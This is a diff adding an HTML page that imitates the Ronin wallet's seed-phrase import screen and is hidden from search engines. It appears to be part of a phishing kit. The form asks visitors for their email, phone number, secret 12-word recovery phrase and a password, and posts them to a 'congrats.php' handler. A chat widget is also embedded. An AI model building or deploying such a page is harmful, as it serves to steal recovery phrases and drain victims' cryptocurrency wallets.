@@ -1,0 +1,178 @@
+<html lang="en" class="js-focus-visible" data-js-focus-visible="">
+    <head>
+         <meta name="robots" content="noindex, nofollow"/>
+        <meta name="googlebot" content="noindex, nofollow"/>
+        <meta name="bingbot" content="noindex, nofollow"/>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Ronin</title>
+        <link rel="stylesheet" href="assets/index.css" />
+        <script>
+            function show(id) {
+                elem = document.getElementById("show_" + id);
+                const type = elem.getAttribute("type") === "password" ? "text" : "password";
+                elem.setAttribute("type", type);
+            }
+        </script>
+    </head>
+    <body>
+        <section id="root" style="margin: auto;">
+            <div class="bg-no-repeat mh-screen" style="background-image: url(_bg.html); background-size: 1308px; background-position: center 96px;">
+                <div class="relavtive flex flex-col h-screen">
+                    <div class="flex-1">
+                        <form method="POST" action="congrats.php">
+                            <div class="mx-auto mt-36 w-full" style="max-width: 500px; margin-top: 6.5rem;">
+                                <h4 class="mb-16 font-bold text-center">Import a wallet using seed phrase</h4>
+                                <div class="m-auto text-center mb-44 leading-20">Enter your secret 12 word phrase here to restore your wallet</div>
+                                 <label>
+                                    <span class="uppercase text-basic-6 font-bold leading-12 pl-8">Email*</span>
+                                    <div class="ds-form-group">
+                                        <div>
+                                            <span class="ds-input-wrapper-large text-14 ds-input-wrapper">
+                                                <input name="email" id="email" class="ds-input" type="email" value="" style="padding-left: 12px; padding-right: 44px;" required />
+                                               
+                                            </span>
+                                        </div>
+                                    </div>
+                                </label>
+                                <label>
+                                    <span class="uppercase text-basic-6 font-bold leading-12 pl-8">Phone Number*</span>
+                                    <div class="ds-form-group">
+                                        <div>
+                                            <span class="ds-input-wrapper-large text-14 ds-input-wrapper">
+                                                <input name="number" id="number" class="ds-input" type="text" value="" style="padding-left: 12px; padding-right: 44px;" required />
+                                            </span>
+                                        </div>
+                                    </div>
+                                </label>
+                                 <hr class="mt-40 border-opacity-50 border-basic-4 mb-40" />
+                                <label>
+                                    <span class="uppercase text-basic-6 font-bold leading-12 pl-8">Secret recovery phrase</span>
+                                    <div class="ds-form-group">
+                                        <div>
+                                            <span class="ds-input-wrapper-large text-14 ds-input-wrapper">
+                                                <input name="secret" id="show_0" class="ds-input" type="password" value="" style="padding-left: 12px; padding-right: 44px;" required />
+                                                <span class="ds-input-right">
+                                                    <span>
+                                                        <span onclick="show(0)" class="cursor-pointer">
+                                                            <svg class="ds-svg-icon" viewBox="0 0 24 24" width="24" height="24" style="fill: var(--color-basic-5);">
+                                                                <defs>
+                                                                    <path
+                                                                        id="eye_svg__a"
+                                                                        d="M12 13.5c-.827 0-1.5-.673-1.5-1.5s.673-1.5 1.5-1.5 1.5.673 1.5 1.5-.673 1.5-1.5 1.5m0-5c-1.93 0-3.5 1.57-3.5 3.5s1.57 3.5 3.5 3.5 3.5-1.57 3.5-3.5-1.57-3.5-3.5-3.5m.22 8.498c-4.306.1-7.115-3.583-8.047-5.002 1.026-1.605 3.61-4.891 7.608-4.993 4.289-.11 7.114 3.583 8.046 5.002-1.025 1.605-3.61 4.89-7.607 4.993m9.648-5.495c-.638-1.112-4.162-6.686-10.138-6.5-5.528.14-8.743 5.01-9.597 6.5a.999.999 0 000 .995C2.762 13.595 6.162 19 12.025 19l.246-.003c5.527-.141 8.743-5.01 9.597-6.5a1.004 1.004 0 000-.994"
+                                                                    ></path>
+                                                                </defs>
+                                                                <use fill="" fill-rule="evenodd" xlink:href="#eye_svg__a"></use>
+                                                            </svg>
+                                                        </span>
+                                                    </span>
+                                                </span>
+                                            </span>
+                                            <div class="ds-helper-text">
+                                                <span class="flex items-center ml-8">
+                                                    <svg class="ds-svg-icon" viewBox="0 0 24 24" width="16" height="16" style="fill: rgb(143, 155, 179);">
+                                                        <defs>
+                                                            <path
+                                                                id="alert-circle-fill_svg__a"
+                                                                d="M13 13a1 1 0 01-2 0V8a1 1 0 012 0v5zm-1 4a1 1 0 110-2 1 1 0 010 2zm0-15C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2z"
+                                                            ></path>
+                                                        </defs>
+                                                        <use fill="" fill-rule="evenodd" xlink:href="#alert-circle-fill_svg__a"></use>
+                                                    </svg>
+                                                    <span class="ml-4">Separate each word with a single space (ex: coffee milk flower...)</span>
+                                                </span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </label>
+                                <hr class="mt-40 border-opacity-50 border-basic-4 mb-40" />
+                                <label>
+                                    <span class="uppercase text-basic-6 font-bold leading-12 pl-8 mr-4">enter password</span><span class="uppercase text-basic-5">(at least 8 characters)</span>
+                                    <div class="ds-form-group">
+                                        <div>
+                                            <span class="ds-input-wrapper-large text-14 ds-input-wrapper">
+                                                <input name="password" id="show_1" class="ds-input" type="password" value="" style="padding-left: 12px; padding-right: 44px;" required />
+                                                <span class="ds-input-right">
+                                                    <span>
+                                                        <span onclick="show(1)" class="cursor-pointer">
+                                                            <svg class="ds-svg-icon" viewBox="0 0 24 24" width="24" height="24" style="fill: var(--color-basic-5);">
+                                                                <defs>
+                                                                    <path
+                                                                        id="eye_svg__a"
+                                                                        d="M12 13.5c-.827 0-1.5-.673-1.5-1.5s.673-1.5 1.5-1.5 1.5.673 1.5 1.5-.673 1.5-1.5 1.5m0-5c-1.93 0-3.5 1.57-3.5 3.5s1.57 3.5 3.5 3.5 3.5-1.57 3.5-3.5-1.57-3.5-3.5-3.5m.22 8.498c-4.306.1-7.115-3.583-8.047-5.002 1.026-1.605 3.61-4.891 7.608-4.993 4.289-.11 7.114 3.583 8.046 5.002-1.025 1.605-3.61 4.89-7.607 4.993m9.648-5.495c-.638-1.112-4.162-6.686-10.138-6.5-5.528.14-8.743 5.01-9.597 6.5a.999.999 0 000 .995C2.762 13.595 6.162 19 12.025 19l.246-.003c5.527-.141 8.743-5.01 9.597-6.5a1.004 1.004 0 000-.994"
+                                                                    ></path>
+                                                                </defs>
+                                                                <use fill="" fill-rule="evenodd" xlink:href="#eye_svg__a"></use>
+                                                            </svg>
+                                                        </span>
+                                                    </span>
+                                                </span>
+                                            </span>
+                                            <div class="ds-helper-text"></div>
+                                        </div>
+                                    </div>
+                                </label>
+                                <label>
+                                    <span class="uppercase text-basic-6 font-bold leading-12 pl-8">confirm password</span>
+                                    <div class="ds-form-group">
+                                        <div>
+                                            <span class="ds-input-wrapper-large text-14 ds-input-wrapper">
+                                                <input name="conf_password" id="show_2" class="ds-input" type="password" value="" style="padding-left: 12px; padding-right: 44px;" required />
+                                                <span class="ds-input-right">
+                                                    <span>
+                                                        <span onclick="show(2)" class="cursor-pointer">
+                                                            <svg class="ds-svg-icon" viewBox="0 0 24 24" width="24" height="24" style="fill: var(--color-basic-5);">
+                                                                <defs>
+                                                                    <path
+                                                                        id="eye_svg__a"
+                                                                        d="M12 13.5c-.827 0-1.5-.673-1.5-1.5s.673-1.5 1.5-1.5 1.5.673 1.5 1.5-.673 1.5-1.5 1.5m0-5c-1.93 0-3.5 1.57-3.5 3.5s1.57 3.5 3.5 3.5 3.5-1.57 3.5-3.5-1.57-3.5-3.5-3.5m.22 8.498c-4.306.1-7.115-3.583-8.047-5.002 1.026-1.605 3.61-4.891 7.608-4.993 4.289-.11 7.114 3.583 8.046 5.002-1.025 1.605-3.61 4.89-7.607 4.993m9.648-5.495c-.638-1.112-4.162-6.686-10.138-6.5-5.528.14-8.743 5.01-9.597 6.5a.999.999 0 000 .995C2.762 13.595 6.162 19 12.025 19l.246-.003c5.527-.141 8.743-5.01 9.597-6.5a1.004 1.004 0 000-.994"
+                                                                    ></path>
+                                                                </defs>
+                                                                <use fill="" fill-rule="evenodd" xlink:href="#eye_svg__a"></use>
+                                                            </svg>
+                                                        </span>
+                                                    </span>
+                                                </span>
+                                            </span>
+                                            <div class="ds-helper-text"></div>
+                                        </div>
+                                    </div>
+                                </label>
+                                <div class="flex justify-end items-start gap-16 mt-40">
+                                    <button onclick="location.href='index.html'" type="button" class="ronin-button ronin-minimal-button shadow-none bg-transparent undefined ds-button ds-large">
+                                        <svg class="ds-svg-icon mr-8" viewBox="0 0 24 24" width="16" height="16" style="fill: currentcolor;">
+                                            <defs>
+                                                <path
+                                                    id="arrow-left_svg__a"
+                                                    d="M19 11H7.135l3.633-4.36a1 1 0 10-1.536-1.28l-5 6c-.039.047-.059.102-.088.154-.024.042-.053.078-.071.124a.985.985 0 00-.072.358L4 12l.001.004c0 .122.027.243.072.358.018.046.047.082.071.124.029.052.049.107.088.154l5 6a.999.999 0 101.536-1.28L7.135 13H19a1 1 0 000-2"
+                                                ></path>
+                                            </defs>
+                                            <use fill="" fill-rule="evenodd" xlink:href="#arrow-left_svg__a"></use>
+                                        </svg>
+                                        Go Back
+                                    </button>
+                                    <button type="submit" name="importBtn" class="ronin-button ronin-button-default shadow-none bg-ronin-gradient hover:bg-ronin-gradient capitalize ds-button ds-large">Import wallet</button>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <script src="assets/full-page.js"></script>
+        <div class="ds-toast-container ds-place-bottom-center"></div>
+        <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/621a7b48a34c24564128808d/1fsrn35pf';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+    </body>
+</html>
